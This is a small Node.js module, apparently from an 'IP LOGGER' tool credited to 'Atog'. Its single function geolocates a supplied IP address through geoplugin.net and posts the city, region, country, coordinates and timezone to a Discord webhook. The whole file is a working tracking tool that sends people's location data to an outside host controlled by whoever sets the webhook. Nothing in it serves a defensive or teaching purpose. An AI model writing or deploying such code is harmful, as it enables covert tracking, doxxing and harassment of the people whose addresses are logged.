const hookcord = require('hookcord');
const Hook = new hookcord.Hook();
const request = require('request');
const Discord = require('discord.js');
function WebHookFunction(webhookURL, ip) {
  
  const ipLoggerEmbed = new Discord.RichEmbed().setColor('#2f3136')
    
  request(webhookURL, (err, resp, body) => {
    if(err) {
      console.log("Error");
      console.log(err);
      return;
    }
    try{
      body = JSON.parse(body);
      Hook.login(body.id, body.token);
      
        request('http://www.geoplugin.net/json.gp?ip='+ip, (err1, resp1, body1) => {
    if(err1) {
      console.log("Error.");
      console.log(err1);
      return;
    }
    try {
      body1 = JSON.parse(body1);
      let descript = `**IP:** ${body1.geoplugin_request}
**Status:** ${body1.geoplugin_status}
**Delay:** ${body1.geoplugin_delay}
**Continent:** ${body1.geoplugin_continentName}
**Latitude:** ${body1.geoplugin_latitude}
**Longitude:** ${body1.geoplugin_longitude}
**Timezone:** ${body1.geoplugin_timezone}
**City:** ${body1.geoplugin_city}
**Region:** ${body1.geoplugin_region}
**Country:** ${body1.geoplugin_countryName}
`;
      ipLoggerEmbed.addField("__**Data**__", descript, true);
      ipLoggerEmbed.setFooter("Developed by Atog.");
      Hook.setPayload(hookcord.DiscordJS(ipLoggerEmbed));
      Hook.fire().then(response => {}).catch((error) => {
        console.log(error);
      });
    }catch(err1) {
      console.log("Error")
      console.log(err1);
      return;
    }
  });
      
      ipLoggerEmbed.setTitle("**IP LOGGER**");
      
    }catch(err) {
      console.log("Error")
      console.log(err)
      return;
    }
  });
      
  
  
}
module.exports = {
  WebHookFunction
}